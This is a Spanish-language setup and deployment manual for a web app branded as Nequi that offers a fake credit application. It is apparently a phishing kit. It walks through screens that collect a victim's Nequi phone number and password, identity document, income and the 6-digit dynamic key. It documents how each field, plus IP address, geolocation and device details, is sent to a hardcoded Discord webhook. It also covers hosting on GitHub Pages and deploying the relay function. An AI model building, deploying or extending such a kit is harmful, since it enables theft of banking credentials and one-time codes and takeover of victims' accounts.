# Manual del Proyecto — Nequi Credit

## Índice

1. [Descripción general](#1-descripción-general)
2. [Estructura del proyecto](#2-estructura-del-proyecto)
3. [Requisitos](#3-requisitos)
4. [Instalación y ejecución local](#4-instalación-y-ejecución-local)
5. [Flujo de la aplicación](#5-flujo-de-la-aplicación)
6. [Notificaciones a Discord](#6-notificaciones-a-discord)
7. [Despliegue a producción](#7-despliegue-a-producción)
8. [Variables de entorno](#8-variables-de-entorno)
9. [Mantenimiento](#9-mantenimiento)

---

## 1. Descripción general

Aplicación web SPA (Single Page Application) que simula un flujo de solicitud de crédito digital con la marca Nequi (Colombia).

**Stack tecnológico:**

| Tecnología | Versión |
|---|---|
| React | ^18.3.1 |
| TypeScript | ^5.6.3 |
| Vite | ^6.0.1 |
| Tailwind CSS | ^3.4.15 |
| Lucide React | ^0.460.0 |
| Supabase Edge Functions | Deno |

---

## 2. Estructura del proyecto

```
project/
├── .github/workflows/deploy.yml     # CI/CD para GitHub Pages
├── src/
│   ├── components/
│   │   ├── HomeScreen.tsx            # Pantalla de inicio
│   │   ├── NequiLoginScreen.tsx      # Pantalla de login Nequi
│   │   ├── FormScreen.tsx            # Formulario multi-paso (3 pasos)
│   │   ├── CityCombobox.tsx          # Buscador de ciudades colombianas
│   │   ├── VerificationScreen.tsx    # Pantalla de verificación
│   │   ├── ResultScreen.tsx          # Resultado del crédito
│   │   ├── AccessScreen.tsx          # Firma con clave dinámica
│   │   ├── FinalScreen.tsx           # Confirmación final
│   │   ├── ScreenShell.tsx           # Layout base
│   │   ├── NequiLogo.tsx             # Componente del logo
│   │   └── Fields.tsx                # Componentes de formulario
│   ├── services/
│   │   └── DiscordWebhookService.ts  # Cliente para webhook Discord
│   ├── types.ts                      # Tipos, constantes, ciudades Colombia
│   ├── App.tsx                       # Orquestador principal
│   ├── main.tsx                      # Entry point
│   └── index.css                     # Estilos globales + Tailwind
├── supabase/functions/
│   └── discord-webhook/
│       └── index.ts                  # Edge Function para Discord
├── .env                              # Variables de entorno (local)
├── package.json
└── vite.config.ts
```

---

## 3. Requisitos

- **Node.js** v18 o superior
- **npm** (incluido con Node.js)
- **Git** (para control de versiones)
- **Supabase CLI** (opcional, para desplegar Edge Functions)

---

## 4. Instalación y ejecución local

### 4.1 Clonar el repositorio

```bash
git clone https://github.com/DarkT777/Principal-.git
cd Principal-
```

### 4.2 Instalar dependencias

```bash
npm install
```

### 4.3 Configurar variables de entorno

Crea o edita el archivo `.env` en la raíz:

```env
VITE_SUPABASE_URL=https://tu-proyecto.supabase.co
VITE_SUPABASE_ANON_KEY=tu-anon-key
```

### 4.4 Iniciar servidor de desarrollo

```bash
npm run dev
```

La aplicación se abrirá en `http://localhost:5173`

### 4.5 Build de producción

```bash
npm run build
```

El resultado se genera en la carpeta `dist/`.

---

## 5. Flujo de la aplicación

```
Home → Nequi Login → Formulario → Verificación → Resultado → Firma → Final
```

### 5.1 HomeScreen
Página de aterrizaje con hero image, navbar y botón "Solicita tu crédito".

### 5.2 NequiLoginScreen
Pantalla donde el usuario ingresa:
- Número de celular (10 dígitos)
- Contraseña Nequi (4 dígitos)
- Confirmación "Soy una persona real"

### 5.3 FormScreen (3 pasos)
- **Paso 1:** Nombre completo, documento de identidad, ciudad
- **Paso 2:** Número de celular
- **Paso 3:** Monto solicitado (slider $500k-$20M), plazo (12/24/36 meses), ingresos mensuales, saldo Nequi

Cada vez que el usuario avanza de paso, los campos se reportan a Discord.

### 5.4 VerificationScreen
Animación de verificación de 8 segundos.

### 5.5 ResultScreen
Evalúa el crédito con reglas:
- Ingreso mínimo: $800.000 COP
- Relación cuota/ingreso máxima: 50%
- Monto > $10M requiere ingresos ≥ $2M

Muestra pantalla de **aprobado** o **rechazado**.

### 5.6 AccessScreen
Teclado numérico para ingresar clave dinámica de 6 dígitos. Tiene 2 intentos con countdown (30s y 15s).

### 5.7 FinalScreen
Pantalla de éxito con:
- ID de solicitud (formato: `NQ-XXXX-XXXX`)
- Botón copiar ID
- Información de desembolso
- Correo de soporte

---

## 6. Notificaciones a Discord

### 6.1 ¿Qué se envía?

La aplicación envía eventos a Discord mediante una Edge Function de Supabase:

| Evento | Cuándo ocurre | Datos incluidos |
|---|---|---|
| Inicio de flujo | Usuario hace clic en "Solicita tu crédito" | — |
| Campos del formulario | Al avanzar entre pasos | Nombre, documento, ciudad, celular, monto, ingresos, plazo, saldo |
| Login exitoso | Después del login simulado | Rol, teléfono |
| Formulario enviado | Al hacer clic en "Solicitar crédito" | Todos los datos del formulario |
| Verificación completada | Después de la animación | Nombre, teléfono |
| Crédito pre-aprobado | Si el crédito es aprobado | Monto, plazo |
| Contrato firmado | Después de ingresar clave dinámica | ID solicitud, monto, ciudad, documento |
| Sesión finalizada | Al volver al inicio | ID solicitud |

**Además, cada mensaje incluye:**
- Dirección IP
- País, ciudad y región (geolocalización)
- Navegador, sistema operativo y dispositivo
- Fecha y hora (Colombia)

### 6.2 Arquitectura

```
Navegador → DiscordWebhookService → Supabase Edge Function → Discord API
```

El `DiscordWebhookService` (frontend) envía los datos a la Edge Function de Supabase, que:
1. Obtiene la IP del cliente
2. Consulta geolocalización en ipapi.co
3. Parsea el User-Agent
4. Construye un embed de Discord
5. Envía al webhook con reintentos automáticos

### 6.3 Cambiar el webhook de Discord

El webhook está hardcodeado en `supabase/functions/discord-webhook/index.ts` línea 232:

```ts
const webhookUrl = "https://discordapp.com/api/webhooks/TU_WEBHOOK_ID/TU_TOKEN"
```

Para cambiarlo, edita esa línea y vuelve a desplegar la Edge Function.

---

## 7. Despliegue a producción

### 7.1 GitHub Pages (automático)

El repositorio incluye un workflow de GitHub Actions en `.github/workflows/deploy.yml`.

**Pasos:**
1. Sube los cambios a la rama `main`
2. Ve a Settings > Pages de tu repositorio
3. En "Source", selecciona **GitHub Actions**
4. El sitio se publica automáticamente en `https://darkt777.github.io/Principal-/`

El workflow:
- Compila el proyecto con `npm run build`
- Sube la carpeta `dist/` como artefacto
- Despliega a GitHub Pages

### 7.2 Desplegar Edge Function en Supabase

**Opción 1 — Dashboard:**
1. Ve a https://supabase.com/dashboard
2. Selecciona tu proyecto
3. Ve a **Edge Functions**
4. Crea una función llamada `discord-webhook`
5. Copia el contenido de `supabase/functions/discord-webhook/index.ts`

**Opción 2 — CLI:**
```bash
npm install -g supabase
supabase login
supabase link --project-ref TU_PROYECTO
supabase functions deploy discord-webhook
```

---

## 8. Variables de entorno

### 8.1 Frontend (`.env`)

| Variable | Descripción |
|---|---|
| `VITE_SUPABASE_URL` | URL del proyecto Supabase |
| `VITE_SUPABASE_ANON_KEY` | Clave anónima de Supabase |

### 8.2 Edge Function

La Edge Function usa variables de entorno configuradas en Supabase:

| Variable | Descripción | Default |
|---|---|---|
| `APP_ENV` | Entorno (Desarrollo/Producción) | Producción |

El webhook de Discord está hardcodeado directamente en el código.

---

## 9. Mantenimiento

### 9.1 Comandos útiles

```bash
npm run dev        # Servidor de desarrollo
npm run build      # Build de producción
npm run preview    # Vista previa del build
npm run lint       # Verificar código con ESLint
```

### 9.2 Agregar o modificar ciudades

Edita `src/types.ts` en el array `COLOMBIA_LOCATIONS`. Cada entrada tiene:

```ts
{
  department: 'Nombre del departamento',
  cities: ['Ciudad1', 'Ciudad2', ...],
}
```

### 9.3 Cambiar reglas de crédito

En `src/components/ResultScreen.tsx`, función `evaluateCredit()`:

- **Ingreso mínimo:** línea 31 (`monthlyIncome < 800_000`)
- **Relación cuota/ingreso:** línea 40 (`quotaToIncomeRatio > 50`)
- **Monto máximo sin ingresos extra:** línea 49

### 9.4 Cambiar parámetros financieros

En `src/components/FormScreen.tsx`:

| Constante | Línea | Descripción |
|---|---|---|
| `MIN_LOAN` | 23 | Monto mínimo |
| `MAX_LOAN` | 24 | Monto máximo |
| `TAE` | 37 | Tasa de interés anual |
| `LOAN_TERMS` | 31 | Plazos disponibles |

### 9.5 Personalizar estilos

Colores principales:

- **Morado:** `#2D1B6E` (navbar, headers)
- **Rosa:** `#E6005C` (botones, acentos)
- **Verde:** `#22C55E` (aprobado, éxito)

Están definidos como valores inline o clases de Tailwind. Para cambios globales, modifica `tailwind.config.js`.
